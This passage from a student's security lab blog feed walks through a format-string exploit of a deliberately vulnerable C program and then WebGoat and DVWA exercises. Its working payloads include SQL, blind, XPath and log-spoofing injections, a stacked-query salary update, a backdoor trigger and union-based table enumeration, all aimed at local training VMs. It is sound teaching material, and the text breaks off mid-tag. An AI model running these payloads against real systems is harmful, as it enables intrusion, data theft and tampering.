class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*ErrFunc)</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GhastlyError</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> err)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Unrecoverable error! - err = %d\n"</span>, err);</span><br><span class="line"></span><br><span class="line"><span class="comment">//This is, in general, a bad practice.</span></span><br><span class="line"><span class="comment">//Exits buried deep in the X Window libraries once cost</span></span><br><span class="line"><span class="comment">//me over a week of debugging effort.</span></span><br><span class="line"><span class="comment">//All application exits should occur in main, ideally in one place.</span></span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"I've been hacked!!!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RecoverableError</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> err)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Something went wrong, but you can fix it - err = %d\n"</span>, err);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintMessage</span><span class="params">(<span class="keyword">char</span>* file, <span class="keyword">unsigned</span> <span class="keyword">long</span> err)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ErrFunc fErrFunc;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">512</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(err == <span class="number">5</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//access denied</span></span><br><span class="line">fErrFunc = GhastlyError;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">fErrFunc = RecoverableError;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_snprintf(buf, <span class="keyword">sizeof</span>(buf)<span class="number">-1</span>, <span class="string">"Can'tFind%s"</span>, file);</span><br><span class="line"></span><br><span class="line"><span class="comment">//just to show you what is in the buffer</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>, buf);</span><br><span class="line"><span class="comment">//just in case your compiler changes things on you</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\nAddress of fErrFunc is %p\n"</span>, &amp;fErrFunc);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Here's where the damage is done!</span></span><br><span class="line"><span class="comment">//Don't do this in your code.</span></span><br><span class="line"><span class="comment">//__asm int 3</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, buf);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\nCalling ErrFunc %p\n"</span>, fErrFunc);</span><br><span class="line">fErrFunc(err);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__asm <span class="keyword">int</span> <span class="number">3</span></span><br><span class="line"><span class="keyword">int</span> iTmp = <span class="number">100</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%.300x%hn"</span>,<span class="number">11</span>, &amp;iTmp);</span><br><span class="line">FILE* pFile;</span><br><span class="line"></span><br><span class="line"><span class="comment">//a little cheating to make the example easy</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Address of foo is %p\n"</span>, foo);</span><br><span class="line"></span><br><span class="line"><span class="comment">//this will only open existing files</span></span><br><span class="line">pFile = fopen(argv[<span class="number">1</span>], <span class="string">"r"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(pFile == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//PrintMessage(argv[1], errno);</span></span><br><span class="line">PrintMessage(argv[<span class="number">1</span>], errno);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Opened %s\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">fclose(pFile);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源代码包含多个函数：其中<code>foo()</code>是需要执行的隐藏函数，其他函数为错误处理函数，下面重点分析<code>main()</code>函数</p><ul><li><p><code>main()</code>函数会输出一些栈的信息，包括<code>foo()</code>函数的地址</p></li><li><p>判断文件是否存在</p><ul><li>如果存在，则提示文件已经打开</li><li>如果不存在，调用<code>PrintMessgae()</code>输出错误信息<ul><li><code>err=5</code>，调用<code>GhastlyError()</code>提示错误不可修复</li><li><code>err≠5</code>，调用<code>RecoverableError()</code>提示错误可修复</li><li>输出其它错误信息</li></ul></li></ul></li><li><p><code>main()</code>函数的整体结构如下</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565923636510.png" alt="1565923636510"></p></li></ul></li><li><p>分析：若想调用<code>foo</code>函数，可以通过<code>%n</code>把<code>fErrFunc</code>函数指针的地址改为<code>foo</code>函数的地址。命令行参数为<code>%x%x…%x%x%n+fErrFunc函数指针的地址</code>。<code>Buf</code>为<code>Can’tfind%x%x…%x%x%n+fErrFunc函数指针的地址</code>，由于<code>fprinf</code>中缺少参数，所以已打出的字符总数通过<code>%n</code>被写入<code>fErrFunc</code>函数指针的地址。通过控制<code>%x</code>调整字符总数以达到目的。</p></li><li><p>尝试传递一串参数 <code>%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x</code>得到，<code>fErrFunc</code>地址是<code>0x0012FF18</code>，目标函数<code>foo</code>函数地址为<code>0x00401014</code>，所以只要把<code>0x0012ff18</code>内存储的<code>0x00401005</code>更改为<code>0x00401014</code>即可</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565923737593.png" alt="1565923737593"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565923745441.png" alt="1565923745441"></p></li><li><p>在参数<code>%x</code>后输入字符串<code>bupt</code>，得到结果如下，与上述相比多了字符串<code>bupt</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565923770857.png" alt="1565923770857"></p></li><li><p>需要把<code>0x0012ff18</code>放在一个可写位置，在前面加上<code>. . . . . . .</code>来调整<code>%x</code>输出的内容，结果如下</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565923807357.png" alt="1565923807357"></p></li><li><p><code>%p</code>改成<code>%hn</code>，减少一个<code>.</code>，后面加上<code>fErrFunc</code>的地址<code>\x18\xFF\x12</code>，可以看到<code>ErrcFunc</code>已被更改为<code>0x0040017E</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565923848164.png" alt="1565923848164"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565923855140.png" alt="1565923855140"></p></li><li><p><code>0x0040017E</code>与<code>0x00401014</code>相差<code>3734</code>个字节，第一个<code>%x</code>打印了<code>6</code>个字节，删掉的四个 <code>.</code> 相当于少打印了<code>4</code>个字节，所以要把这<code>10</code>个字节加回去。所以参数里加上<code>%3744x</code>。更改参数后程序成功执行<code>foo</code>函数，显示<code>I’ve been hacked!!!</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565923921328.png" alt="1565923921328"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565923927212.png" alt="1565923927212"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 软件安全实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 格式化输出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入 实验报告</title>
      <link href="/SQL%E6%B3%A8%E5%85%A5-%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.html"/>
      <url>/SQL%E6%B3%A8%E5%85%A5-%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.html</url>
      
        <content type="html"><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ol><li>安装和配置<code>WebGoat</code>与<code>WebScarab</code>；</li><li>使用<code>WebGoat</code>，根据提示信息，完成包括<code>Injection Flaw</code>大类下的<code>String SQL</code>注入，<code>Numeric SQL</code>注入，<code>Log Spoofing</code>，<code>XPATH Injection</code>等安全弱点的攻击测试。<a id="more"></a></li></ol><h1 id="安装和配置WebGoat与WebScarab"><a href="#安装和配置WebGoat与WebScarab" class="headerlink" title="安装和配置WebGoat与WebScarab"></a>安装和配置<code>WebGoat</code>与<code>WebScarab</code></h1><ol><li><p>用于测试的主机已经配置完成<code>JAVA</code>环境，在使用<code>WebScarab</code>时只需要在<code>webscarab-selfcontained-20070504-1631.jar</code>文件所在的目录调出命令行，输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar webscarab-selfcontained-20070504-1631.jar</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565859620286.png" alt="1565859620286"></p></li><li><p>使用<code>Vmware</code>安装一个<code>ubuntu</code>虚拟机，镜像选择<code>GameOver.0.1.null.iso</code>，该镜像已经配置好<code>WebGoat</code>环境</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565859645909.png" alt="1565859645909"></p></li><li><p>安装完成后，输入命令行：<code>ifconfig</code>，查看IP地址为<code>192.168.88.149</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565859672911.png" alt="1565859672911"></p></li><li><p>访问URL：<code>http://192.168.88.149:8080/WebGoat/attack</code>，输入用户名<code>guest</code>和密码<code>guest</code>，显示如下页面说明安装成功，点击<code>start WebGoat</code>，然后点击<code>injection flaws</code>进行攻击测试</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565859727470.png" alt="1565859727470"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565859743879.png" alt="1565859743879"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565859750160.png" alt="1565859750160"></p></li></ol><h1 id="String-SQL注入"><a href="#String-SQL注入" class="headerlink" title="String SQL注入"></a><code>String SQL</code>注入</h1><ol><li><p>在左侧菜单中找到<code>string SQL injection</code>并单击，在输入框中输入字符串<code>Levi</code>，显示没有结果匹配，同时显示出查找语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user_data</span> <span class="keyword">WHERE</span> last_name = <span class="string">'Levi'</span></span><br></pre></td></tr></table></figure></li><li><p>根据该查找语句，输入<code>‘ or 1=1 --</code>，构造语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user_data</span> <span class="keyword">WHERE</span> last_name = <span class="string">''</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span> <span class="comment">-- '</span></span><br></pre></td></tr></table></figure><p><code>--</code>是数据库语言中的注释字符，它的作用是将最后一个单引号变为无效字符，查询语言等同于：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user_data</span></span><br></pre></td></tr></table></figure><p>结果显示user_data中所有的数据</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565859930271.png" alt="1565859930271"></p></li></ol><h1 id="Numeric-SQL注入"><a href="#Numeric-SQL注入" class="headerlink" title="Numeric SQL注入"></a><code>Numeric SQL</code>注入</h1><ol><li><p>在左侧菜单中找到<code>string SQL injection</code>并单击，页面中有一个下拉框，点击<code>GO！</code>按钮可以得到查询结果如图所示，同时显示出查找语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> weather_data <span class="keyword">WHERE</span> station = <span class="number">101</span></span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860072183.png" alt="1565860072183"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860083941.png" alt="1565860083941"></p></li><li><p>因为页面中的输入项变成了下拉框，所以没法直接构造查询字符串， 之前的<code>String SQL</code>注入在这里无法完成，需要借助<code>WebScarab</code>代理工具来完成<code>SQL</code>注入攻击，使用之前配置的<code>JAVA</code>环境，在<code>webscarab-selfcontained-20070504-1631.jar</code>所在的目录打开命令行，并输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar webscarab-selfcontained-20070504-1631.jar</span><br></pre></td></tr></table></figure><p>打开<code>WebScarab</code>，在<code>Intercept</code>标签中选定<code>Intercept Request</code>，并在<code>Methods</code>中选定<code>POST</code>方法</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860227911.png" alt="1565860227911"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860232723.png" alt="1565860232723"></p></li><li><p>将使用的火狐浏览器设置为手动代理，地址为<code>127.0.0.1</code>，端口为<code>8008</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860258781.png" alt="1565860258781"></p></li><li><p>在网页上继续点击<code>GO!</code> ，这时<code>WebScarab</code>会弹出<code>Edit Request</code>窗口，代理设置生效，浏览器的请求经过代理转发。<code>URLEncoded</code>栏中可以看到<code>Request</code>中传递的参数，其中<code>station</code>就是下拉选框的参数，可以看到其值为<code>101</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860336407.png" alt="1565860336407"></p></li><li><p>将该参数修改为<code>101 or 1=1</code>，构造语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> weather_data <span class="keyword">WHERE</span> station = <span class="number">101</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>查询语言等同于：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> weather_data</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860390596.png" alt="1565860390596"></p></li><li><p>点击<code>Accept changes</code>按钮提交<code>Request</code>请求，数据库中所有数据内容都显示在页面上</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860424728.png" alt="1565860424728"></p></li></ol><h1 id="Blind-SQL注入"><a href="#Blind-SQL注入" class="headerlink" title="Blind SQL注入"></a><code>Blind SQL</code>注入</h1><ol><li><p>在左侧菜单中找到<code>Blind SQL injection</code>并单击，跳转到<code>Blind SQL injection</code>页面，根据提示需要盲注以找到正确的<code>first_name</code> (由大小写字母构成)，更改输入框内容，发现只有<code>101</code>是合法的</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860517736.png" alt="1565860517736"></p></li><li><p>将使用的火狐浏览器设置为同上的手动代理，启动<code>WebScarab</code>，在网页上点击<code>GO!</code> ，这时<code>WebScarab</code>会弹出<code>Edit Request</code>窗口，代理设置生效，浏览器的请求经过代理转发</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860549367.png" alt="1565860549367"></p></li><li><p>使用盲注工具<code>JHijack</code>进行盲注，设置<code>HijackData</code>为<code>Numeric</code>，范围为<code>65-122</code>(大小写字母<code>ASCII码</code>范围)，<code>Host</code>设置为该网站的IP地址<code>192.168.88.149</code>，<code>Port</code>设置为<code>8080</code>，URL设置为<code>/WebGoat/attack?Screen=163&amp;menu=1200</code>，方法改为<code>POST</code>，<code>Grep</code>设置为<code>Account number is valid</code>，<code>SESS ID</code>设置为上图中的<code>Cookie</code>内容<code>JSESSIONID=A734E5274D7A7D5D84E2D529D5D3146</code><br><code>4</code>，<code>Hijack Type</code>设置为<code>BODY</code>，<code>Hijack ID</code>设置为<code>account_number=101 AND (SELECT ASCII(SUBSTR(first_name,1,1)) FROM user_data WHERE userid = 15613 ) =$ --</code>，点击<code>Hijack</code>按钮，进行第一个字符的盲注，结果得到第一个字符的<code>ASCII码</code>为<code>74</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860682841.png" alt="1565860682841"></p></li><li><p>将<code>Hijack ID</code>里面的<code>(first_name,1,1)</code>更改为<code>(first_name,2,1)</code>，点击<code>Hijack</code>，获取第二个字符的<code>ASCII码</code>为<code>111</code>，以此类推，直至到七个字符时，并未获得结果，说明，<code>first_name</code>由六个字符构成，将<code>ASCII码</code>转换成字母为：<strong><code>Joesph</code></strong></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860769818.png" alt="1565860769818"></p></li><li><p>将正确的<code>first_name：Joseph</code>输入到输入框点击<code>GO!</code> ，注入成功</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860799195.png" alt="1565860799195"></p></li></ol><h1 id="Log-Spoofing-日志欺骗"><a href="#Log-Spoofing-日志欺骗" class="headerlink" title="Log Spoofing(日志欺骗)"></a><code>Log Spoofing</code>(日志欺骗)</h1><ol><li><p>在左侧菜单中找到<code>Log Spoofing</code>并单击，页面中出现两个输入框，在<code>username</code>输入框输入<code>1‘ or 1=1 --</code>，点击<code>login</code>，查询失败，同时显示：<code>Login failed for username: 1&#39; or 1=1 --</code>，很明显，显示的内容是<code>Web</code>服务器的日志中的记录的内容</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860881715.png" alt="1565860881715"></p></li><li><p>在输入框中输入<code>1 Login Succeeded for username :</code><br><code>admin</code>，会显示<code>Login failed for username: 1 Login Succeeded for username : admin</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860912207.png" alt="1565860912207"></p></li><li><p>利用换行符<code>%0A</code>将输入内容在<code>Login</code>前面分成两行，即在输入框输入：<code>1%0d%0aLogin Succeeded for username:admin</code>，尝试欺骗管理员，点击<code>Login</code>后在日志中显示成功使用户名<code>admin</code>登录，登录日志为<br><code>Login failed for username: 1</code><br><code>Login Succeeded for username:admin</code></p><p>(注意：在换行的时候要使用换行符<code>%0A</code>，如果使用回车符<code>%0D</code>则只能显示登录日志，不显示攻击成功)</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861012855.png" alt="1565861012855"></p></li></ol><h1 id="XPATH注入"><a href="#XPATH注入" class="headerlink" title="XPATH注入"></a><code>XPATH</code>注入</h1><ol><li><p>在左侧菜单中找到<code>XPATH Injection</code>并单击，页面中出现两个输入框，根据提示在<code>username</code>输入框输入<code>Levi</code>，在<code>username</code>输入框输入<code>test123</code>，点击<code>submit</code>，网页显示<code>Mike</code>的相关信息</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861154130.png" alt="1565861154130"></p></li><li><p>在用户名处输入<code>&#39; or 1=1 or &#39;a&#39; = &#39;a</code>,密码任意输入，这样服务器解析后的结果为<code>expression = &quot;/employees/employee[ (loginID/text() = &#39; or 1=1 ) OR ( &#39;a&#39; = &#39;a&#39; and passwd/text () = &#39;password&#39; )]&quot;</code> ，结果显示所有人的信息</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861244754.png" alt="1565861244754"></p></li></ol><h1 id="LAB-SQL-Injection"><a href="#LAB-SQL-Injection" class="headerlink" title="LAB:SQL Injection"></a><code>LAB:SQL Injection</code></h1><ol><li><p>在左侧菜单中找到<code>string SQL injection</code>中的<code>Stage 1: String SQL Injection</code>并单击，根据网页提示，需要以<code>boss</code>的用户名<code>Neville</code>进行绕过密码登录</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861365764.png" alt="1565861365764"></p></li><li><p>尝试在密码输入栏输入：<code>‘ or 1=1 --</code>，点击<code>Login</code>后显示登录失败</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861388823.png" alt="1565861388823"></p></li><li><p>查看网页源码，发现输入的密码被限制最大长度为<code>8</code>个字符</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861415462.png" alt="1565861415462"></p></li><li><p>将网页源码中最大长度修改为<code>20</code>，然后在输入：<code>‘</code><br><code>or 1=1 --</code>，点击<code>Login</code>后，成功绕过密码，显示登录成功</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861522793.png" alt="1565861522793"></p></li><li><p>在左侧菜单中找到<code>string SQL injection</code>中的<code>Stage 3: Numeric SQL Injection</code>并单击，根据网页提示，需要以<code>employee</code>账户的用户名<code>Larry</code>进行登录，绕过权限限制，浏览<code>boss</code>的账户信息</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861561587.png" alt="1565861561587"></p></li><li><p>在密码输入栏输入：<code>Larry</code>，成功登录</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861581845.png" alt="1565861581845"></p></li><li><p>将使用的火狐浏览器设置为手动代理，地址为<code>127.0.0.1</code>，端口为<code>8008</code>。点击<code>ViewProfile</code>，这时<code>WebScarab</code>会弹出<code>Edit Request</code>窗口，代理设置生效，浏览器的请求经过代理转发。在<code>URLEncoded</code>栏中添加一条参数<code>employee_id</code>，内容是：<code>101 or 1=1 order by salary desc</code>，点击<code>Accept changes</code>提交更改，绕过权限限制，<code>employee</code>账户<code>Larry</code>成功浏览<code>boss</code>的账户信息</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861666493.png" alt="1565861666493"></p></li></ol><h1 id="Database-Backdoors"><a href="#Database-Backdoors" class="headerlink" title="Database Backdoors"></a>Database Backdoors</h1><ol><li><p>在左侧菜单中找到<code>Database Backdoors</code>并单击。根据提示，<code>User ID</code>为<code>101</code>。这个页面可以看到自己的<code>password</code>, <code>ssn</code>和<code>salary</code>。我们需要使用一个易受攻击的字段来创建两条<code>SQL</code>语句并尝试注入另一个更新，将工资更新到更高的级别</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861755893.png" alt="1565861755893"></p></li><li><p>在输入框中输入<code>101 OR 1=1</code>，尝试注入，结果显示所有<code>User ID</code>的信息，注入成功</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861777502.png" alt="1565861777502"></p></li><li><p>选择<code>User ID</code>为<code>105</code>，将他的<code>Salary</code>由<code>50000</code>更改为<code>900000</code>，输入的内容为：<code>103;UPDATE employee SET salary=900000 WHERE userid=105</code>，点击<code>Submit</code>，显示注入成功</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861836101.png" alt="1565861836101"></p></li><li><p>接下来是创建一个后门，根据提示，输入：<code>105; CREATE TRIGGER myBackDoor BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email = &#39;john@hackme.com&#39; WHERE userid = 105</code>，点击<code>Submit</code>，显示注入成功</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861901321.png" alt="1565861901321"></p></li></ol><h1 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h1><p>针对<code>DVWA</code>演练平台，在<code>SQL Injection</code>攻击实验中，且要求在低级和中级安全级别中，获取用户信息表中全部的用户名及口令信息，并尝试将数据库所有库表数据全部拖出。</p><p>在浏览器中输入<code>http://192.168.88.149 /dvwa</code>进入<code>DVWA</code>平台，输入用户名<code>admin</code>，密码<code>password</code>，成功登录平台</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861980984.png" alt="1565861980984"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861986023.png" alt="1565861986023"></p><h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><h3 id="安全级别低级"><a href="#安全级别低级" class="headerlink" title="安全级别低级"></a>安全级别低级</h3><ol><li><p>进行安全级别设置</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862043052.png" alt="1565862043052"></p></li><li><p>选择<code>SQL Injection</code>，输入<code>ID</code>为<code>1</code>，得到结果如下</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862076676.png" alt="1565862076676"></p></li><li><p>尝试输入<code>‘ or 1=1--</code>，得到报错信息，说明表单存在注入漏洞且不是数字型注入</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862098254.png" alt="1565862098254"></p></li><li><p>尝试字符型注入，输入<code>1’ or ‘1’=’1</code>，成功遍历数据库中的内容</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862121610.png" alt="1565862121610"></p></li><li><p>测试查询信息列数，输入<code>1’ order by x --</code> </p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862152256.png" alt="1565862152256"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862157243.png" alt="1565862157243"></p><p>当测试到<code>3</code>时，出现报错信息，说明查询结果值为<code>2</code>列</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862174858.png" alt="1565862174858"></p></li><li><p>输入<code>1&#39; union select 1,2 --</code> ，确定字段的顺序为<strong>First name</strong>，<strong>Surname</strong></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862222733.png" alt="1565862222733"></p></li><li><p>输入<code>1’ union select 1,database() --</code> ，得知数据库名为<code>dvwa</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862284087.png" alt="1565862284087"></p></li><li><p>输入<code>1&#39; union select 1,table_name from information_schema.tables where table_schema=&#39;dvwa&#39;--</code> ，得知数据库两个表名为<code>guestbook</code>和<code>users</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862325209.png" 